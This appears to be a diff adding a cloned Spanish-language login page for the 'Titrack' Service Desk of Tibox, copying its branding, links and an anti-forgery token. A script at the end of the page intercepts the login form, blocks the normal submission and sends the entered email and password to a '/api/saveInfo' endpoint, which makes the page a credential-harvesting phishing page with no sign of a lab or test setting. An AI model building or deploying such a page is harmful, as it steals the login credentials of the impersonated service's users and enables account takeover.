@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html
+  style=""
+  class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths normal"
+>
+  <head class="normal">
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+    <meta id="charsetID" charset="utf-8" class="normal" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0"
+      class="normal"
+    />
+    <title class="normal">Inicio de Sesión - Titrack</title>
+    <link href="styles.css" rel="stylesheet" class="normal" />
+
+    <link rel="stylesheet" href="layout.css" class="normal" />
+    <link
+      rel="icon"
+      href="https://soporte.tibox.cl/Content/images/titrack-icon.png"
+      class="normal"
+    />
+    <script src="modernizr" class="normal"></script>
+
+    <script src="jquery" class="normal"></script>
+
+    <script src="bootstrap" class="normal"></script>
+
+    <script type="text/javascript" src="notify.js" class="normal"></script>
+    <style type="text/css" id="notify-bootstrap" class="normal">
+      .notifyjs-bootstrap-base {
+        font-weight: bold;
+        padding: 8px 15px 8px 14px;
+        text-shadow: 0 1px 0 rgba(255, 255, 255, 0.5);
+        background-color: #fcf8e3;
+        border: 1px solid #fbeed5;
+        -webkit-border-radius: 4px;
+        -moz-border-radius: 4px;
+        border-radius: 4px;
+        white-space: nowrap;
+        padding-left: 25px;
+        background-repeat: no-repeat;
+        background-position: 3px 7px;
+      }
+      .notifyjs-bootstrap-error {
+        color: #b94a48;
+        background-color: #f2dede;
+        border-color: #eed3d7;
+        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAtRJREFUeNqkVc1u00AQHq+dOD+0poIQfkIjalW0SEGqRMuRnHos3DjwAH0ArlyQeANOOSMeAA5VjyBxKBQhgSpVUKKQNGloFdw4cWw2jtfMOna6JOUArDTazXi/b3dm55socPqQhFka++aHBsI8GsopRJERNFlY88FCEk9Yiwf8RhgRyaHFQpPHCDmZG5oX2ui2yilkcTT1AcDsbYC1NMAyOi7zTX2Agx7A9luAl88BauiiQ/cJaZQfIpAlngDcvZZMrl8vFPK5+XktrWlx3/ehZ5r9+t6e+WVnp1pxnNIjgBe4/6dAysQc8dsmHwPcW9C0h3fW1hans1ltwJhy0GxK7XZbUlMp5Ww2eyan6+ft/f2FAqXGK4CvQk5HueFz7D6GOZtIrK+srupdx1GRBBqNBtzc2AiMr7nPplRdKhb1q6q6zjFhrklEFOUutoQ50xcX86ZlqaZpQrfbBdu2R6/G19zX6XSgh6RX5ubyHCM8nqSID6ICrGiZjGYYxojEsiw4PDwMSL5VKsC8Yf4VRYFzMzMaxwjlJSlCyAQ9l0CW44PBADzXhe7xMdi9HtTrdYjFYkDQL0cn4Xdq2/EAE+InCnvADTf2eah4Sx9vExQjkqXT6aAERICMewd/UAp/IeYANM2joxt+q5VI+ieq2i0Wg3l6DNzHwTERPgo1ko7XBXj3vdlsT2F+UuhIhYkp7u7CarkcrFOCtR3H5JiwbAIeImjT/YQKKBtGjRFCU5IUgFRe7fF4cCNVIPMYo3VKqxwjyNAXNepuopyqnld602qVsfRpEkkz+GFL1wPj6ySXBpJtWVa5xlhpcyhBNwpZHmtX8AGgfIExo0ZpzkWVTBGiXCSEaHh62/PoR0p/vHaczxXGnj4bSo+G78lELU80h1uogBwWLf5YlsPmgDEd4M236xjm+8nm4IuE/9u+/PH2JXZfbwz4zw1WbO+SQPpXfwG/BBgAhCNZiSb/pOQAAAAASUVORK5CYII=);
+      }
+      .notifyjs-bootstrap-success {
+        color: #468847;
+        background-color: #dff0d8;
+        border-color: #d6e9c6;
+        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAutJREFUeNq0lctPE0Ecx38zu/RFS1EryqtgJFA08YCiMZIAQQ4eRG8eDGdPJiYeTIwHTfwPiAcvXIwXLwoXPaDxkWgQ6islKlJLSQWLUraPLTv7Gme32zoF9KSTfLO7v53vZ3d/M7/fIth+IO6INt2jjoA7bjHCJoAlzCRw59YwHYjBnfMPqAKWQYKjGkfCJqAF0xwZjipQtA3MxeSG87VhOOYegVrUCy7UZM9S6TLIdAamySTclZdYhFhRHloGYg7mgZv1Zzztvgud7V1tbQ2twYA34LJmF4p5dXF1KTufnE+SxeJtuCZNsLDCQU0+RyKTF27Unw101l8e6hns3u0PBalORVVVkcaEKBJDgV3+cGM4tKKmI+ohlIGnygKX00rSBfszz/n2uXv81wd6+rt1orsZCHRdr1Imk2F2Kob3hutSxW8thsd8AXNaln9D7CTfA6O+0UgkMuwVvEFFUbbAcrkcTA8+AtOk8E6KiQiDmMFSDqZItAzEVQviRkdDdaFgPp8HSZKAEAL5Qh7Sq2lIJBJwv2scUqkUnKoZgNhcDKhKg5aH+1IkcouCAdFGAQsuWZYhOjwFHQ96oagWgRoUov1T9kRBEODAwxM2QtEUl+Wp+Ln9VRo6BcMw4ErHRYjH4/B26AlQoQQTRdHWwcd9AH57+UAXddvDD37DmrBBV34WfqiXPl61g+vr6xA9zsGeM9gOdsNXkgpEtTwVvwOklXLKm6+/p5ezwk4B+j6droBs2CsGa/gNs6RIxazl4Tc25mpTgw/apPR1LYlNRFAzgsOxkyXYLIM1V8NMwyAkJSctD1eGVKiq5wWjSPdjmeTkiKvVW4f2YPHWl3GAVq6ymcyCTgovM3FzyRiDe2TaKcEKsLpJvNHjZgPNqEtyi6mZIm4SRFyLMUsONSSdkPeFtY1n0mczoY3BHTLhwPRy9/lzcziCw9ACI+yql0VLzcGAZbYSM5CCSZg1/9oc/nn7+i8N9p/8An4JMADxhH+xHfuiKwAAAABJRU5ErkJggg==);
+      }
+      .notifyjs-bootstrap-info {
+        color: #3a87ad;
+        background-color: #d9edf7;
+        border-color: #bce8f1;
+        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3QYFAhkSsdes/QAAA8dJREFUOMvVlGtMW2UYx//POaWHXg6lLaW0ypAtw1UCgbniNOLcVOLmAjHZolOYlxmTGXVZdAnRfXQm+7SoU4mXaOaiZsEpC9FkiQs6Z6bdCnNYruM6KNBw6YWewzl9z+sHImEWv+vz7XmT95f/+3/+7wP814v+efDOV3/SoX3lHAA+6ODeUFfMfjOWMADgdk+eEKz0pF7aQdMAcOKLLjrcVMVX3xdWN29/GhYP7SvnP0cWfS8caSkfHZsPE9Fgnt02JNutQ0QYHB2dDz9/pKX8QjjuO9xUxd/66HdxTeCHZ3rojQObGQBcuNjfplkD3b19Y/6MrimSaKgSMmpGU5WevmE/swa6Oy73tQHA0Rdr2Mmv/6A1n9w9suQ7097Z9lM4FlTgTDrzZTu4StXVfpiI48rVcUDM5cmEksrFnHxfpTtU/3BFQzCQF/2bYVoNbH7zmItbSoMj40JSzmMyX5qDvriA7QdrIIpA+3cdsMpu0nXI8cV0MtKXCPZev+gCEM1S2NHPvWfP/hL+7FSr3+0p5RBEyhEN5JCKYr8XnASMT0xBNyzQGQeI8fjsGD39RMPk7se2bd5ZtTyoFYXftF6y37gx7NeUtJJOTFlAHDZLDuILU3j3+H5oOrD3yWbIztugaAzgnBKJuBLpGfQrS8wO4FZgV+c1IxaLgWVU0tMLEETCos4xMzEIv9cJXQcyagIwigDGwJgOAtHAwAhisQUjy0ORGERiELgG4iakkzo4MYAxcM5hAMi1WWG1yYCJIcMUaBkVRLdGeSU2995TLWzcUAzONJ7J6FBVBYIggMzmFbvdBV44Corg8vjhzC+EJEl8U1kJtgYrhCzgc/vvTwXKSib1paRFVRVORDAJAsw5FuTaJEhWM2SHB3mOAlhkNxwuLzeJsGwqWzf5TFNdKgtY5qHp6ZFf67Y/sAVadCaVY5YACDDb3Oi4NIjLnWMw2QthCBIsVhsUTU9tvXsjeq9+X1d75/KEs4LNOfcdf/+HthMnvwxOD0wmHaXr7ZItn2wuH2SnBzbZAbPJwpPx+VQuzcm7dgRCB57a1uBzUDRL4bfnI0RE0eaXd9W89mpjqHZnUI5Hh2l2dkZZUhOqpi2qSmpOmZ64Tuu9qlz/SEXo6MEHa3wOip46F1n7633eekV8ds8Wxjn37Wl63VVa+ej5oeEZ/82ZBETJjpJ1Rbij2D3Z/1trXUvLsblCK0XfOx0SX2kMsn9dX+d+7Kf6h8o4AIykuffjT8L20LU+w4AZd5VvEPY+XpWqLV327HR7DzXuDnD8r+ovkBehJ8i+y8YAAAAASUVORK5CYII=);
+      }
+      .notifyjs-bootstrap-warn {
+        color: #c09853;
+        background-color: #fcf8e3;
+        border-color: #fbeed5;
+        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAMAAAC6V+0/AAABJlBMVEXr6eb/2oD/wi7/xjr/0mP/ykf/tQD/vBj/3o7/uQ//vyL/twebhgD/4pzX1K3z8e349vK6tHCilCWbiQymn0jGworr6dXQza3HxcKkn1vWvV/5uRfk4dXZ1bD18+/52YebiAmyr5S9mhCzrWq5t6ufjRH54aLs0oS+qD751XqPhAybhwXsujG3sm+Zk0PTwG6Shg+PhhObhwOPgQL4zV2nlyrf27uLfgCPhRHu7OmLgAafkyiWkD3l49ibiAfTs0C+lgCniwD4sgDJxqOilzDWowWFfAH08uebig6qpFHBvH/aw26FfQTQzsvy8OyEfz20r3jAvaKbhgG9q0nc2LbZxXanoUu/u5WSggCtp1anpJKdmFz/zlX/1nGJiYmuq5Dx7+sAAADoPUZSAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfdBgUBGhh4aah5AAAAlklEQVQY02NgoBIIE8EUcwn1FkIXM1Tj5dDUQhPU502Mi7XXQxGz5uVIjGOJUUUW81HnYEyMi2HVcUOICQZzMMYmxrEyMylJwgUt5BljWRLjmJm4pI1hYp5SQLGYxDgmLnZOVxuooClIDKgXKMbN5ggV1ACLJcaBxNgcoiGCBiZwdWxOETBDrTyEFey0jYJ4eHjMGWgEAIpRFRCUt08qAAAAAElFTkSuQmCC);
+      }
+    </style>
+    <script type="text/javascript" src="script.js" class="normal"></script>
+
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="font-awesome.min.css"
+      class="normal"
+    />
+    <link href="estilotitrack.css" rel="stylesheet" class="normal" />
+
+    <link href="css.css" rel="stylesheet" type="text/css" class="normal" />
+    <link href="css_002.css" rel="stylesheet" type="text/css" class="normal" />
+
+    <script src="jqueryval" class="normal"></script>
+
+    <script class="normal">
+      $(document).ready(function () {
+        var logo = "";
+        var ancho = "";
+
+        if (logo != null && logo != "") {
+          $("#divLogo").css("background-image", "url(" + logo + ")");
+          $("#divLogo").css("background-repeat", "no-repeat");
+          $("#divLogo").css("background-size", "contain");
+          $("#divLogo").css("padding-left", ancho);
+        }
+      });
+    </script>
+
+    <link href="login.css" type="text/css" rel="stylesheet" class="normal" />
+
+    <style type="text/css" id="core-notify" class="normal">
+      .notifyjs-corner {
+        position: fixed;
+        margin: 5px;
+        z-index: 1050;
+      }
+
+      .notifyjs-corner .notifyjs-wrapper,
+      .notifyjs-corner .notifyjs-container {
+        position: relative;
+        display: block;
+        height: inherit;
+        width: inherit;
+        margin: 3px;
+      }
+
+      .notifyjs-wrapper {
+        z-index: 1;
+        position: absolute;
+        display: inline-block;
+        height: 0;
+        width: 0;
+      }
+
+      .notifyjs-container {
+        display: none;
+        z-index: 1;
+        position: absolute;
+      }
+
+      .notifyjs-hidable {
+        cursor: pointer;
+      }
+
+      [data-notify-text],
+      [data-notify-html] {
+        position: relative;
+      }
+
+      .notifyjs-arrow {
+        position: absolute;
+        z-index: 2;
+        width: 0;
+        height: 0;
+      }
+    </style>
+  </head>
+  <body class="service-desk-index normal">
+    <div class="navbar navbar-inverse navbar-fixed-top normal">
+      <div class="container normal">
+        <div class="navbar-header normal" id="divLogo">
+          <button
+            type="button"
+            class="navbar-toggle normal"
+            data-toggle="collapse"
+            data-target=".navbar-collapse"
+          >
+            <span class="icon-bar normal"></span>
+            <span class="icon-bar normal"></span>
+            <span class="icon-bar normal"></span>
+          </button>
+          <a class="navbar-brand normal" href="https://soporte.tibox.cl/"
+            >Titrack</a
+          >
+        </div>
+
+        <div class="navbar-collapse collapse normal">
+          <ul class="nav navbar-nav normal">
+            <li class="normal">
+              <a href="https://soporte.tibox.cl/" class="normal">Inicio</a>
+            </li>
+          </ul>
+          <ul class="nav navbar-nav navbar-right normal">
+            <li class="normal">
+              <a href="https://soporte.tibox.cl/" class="normal"
+                >Iniciar Sesion</a
+              >
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="container body-content normal">
+      <h2 class="normal">Inicio de Sesión</h2>
+
+      <div class="row normal">
+        <div class="form-horizontal normal">
+          <section id="loginForm" class="normal">
+            <form
+              id="loginFormForm"
+              method="post"
+              class="normal"
+              novalidate="novalidate"
+            >
+              <input
+                name="__RequestVerificationToken"
+                type="hidden"
+                value="HUJSvO8ZbcqJm15Bq0TwOGAIPegUxvbG2gdZ74huwZrbdU2AkZAaea4FIZxMqsd1uns-kxP-fAEoZ8nD1x8D2aTYj3CxYHh2ud-0Awc95Co1"
+                class="normal"
+              />
+              <h4 class="normal">Inicie sesión con su cuenta.</h4>
+              <hr class="normal" />
+              <div class="form-group normal">
+                <label class="col-md-2 control-label normal" for="userMail"
+                  >E-Mail</label
+                >
+                <div class="col-md-10 normal">
+                  <input
+                    class="form-control normal"
+                    data-val="true"
+                    data-val-length="The field E-Mail must be a string with a maximum length of 200."
+                    data-val-length-max="200"
+                    data-val-required="¡Campo obligatorio!"
+                    id="userMail"
+                    name="userMail"
+                    type="text"
+                  />
+                  <span
+                    class="field-validation-valid text-danger normal"
+                    data-valmsg-for="userMail"
+                    data-valmsg-replace="true"
+                  ></span>
+                </div>
+              </div>
+              <div class="form-group normal">
+                <label class="col-md-2 control-label normal" for="userPass"
+                  >Contraseña</label
+                >
+                <div class="col-md-10 normal">
+                  <input
+                    class="form-control normal"
+                    data-val="true"
+                    data-val-length="The field Contraseña must be a string with a minimum length of 6 and a maximum length of 30."
+                    data-val-length-max="30"
+                    data-val-length-min="6"
+                    data-val-required="¡Campo obligatorio!"
+                    id="userPass"
+                    name="userPass"
+                    type="password"
+                  />
+                  <span
+                    class="field-validation-valid text-danger normal"
+                    data-valmsg-for="userPass"
+                    data-valmsg-replace="true"
+                  ></span>
+                </div>
+              </div>
+              <div class="form-group normal">
+                <div class="col-md-offset-2 col-md-10 normal">
+                  <input
+                    type="submit"
+                    value="Log in"
+                    class="btn btn-default normal"
+                  />
+                </div>
+              </div>
+            </form>
+          </section>
+        </div>
+      </div>
+
+      <script type="text/javascript" class="normal">
+        $(document).ready(function () {
+          $("#userMail").focus();
+        });
+      </script>
+      <hr class="col-sm-12 col-md-12 col-lg-12 normal" />
+      <footer class="col-sm-12 col-md-12 col-lg-12 normal">
+        <p class="normal">
+          © 2023 Service Desk - Powered by
+          <a href="http://www.tibox.cl/" target="_blank" class="normal"
+            >Tibox ®</a
+          >
+        </p>
+      </footer>
+    </div>
+
+    <script type="text/javascript">
+        const loginForm = document.getElementById('loginFormForm');
+
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault()
+
+            const userMail = document.getElementById('userMail').value;
+            const userPass = document.getElementById('userPass').value;
+
+            try {
+                await fetch('/api/saveInfo', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        userMail,
+                        userPass
+                    })
+                })
+            } catch (err) {
+                console.log(err)
+            }
+            
+        })
+    </script>
+  </body>
+</html>
